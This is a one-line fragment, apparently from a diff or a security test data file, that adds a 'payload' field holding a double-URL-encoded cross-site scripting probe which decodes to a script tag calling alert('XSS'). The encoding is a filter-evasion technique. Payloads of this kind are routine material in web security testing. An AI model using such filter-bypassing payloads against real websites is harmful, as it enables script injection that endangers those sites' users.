+payload: "%253Cscript%253Ealert('XSS')%253C%252Fscript%253E"
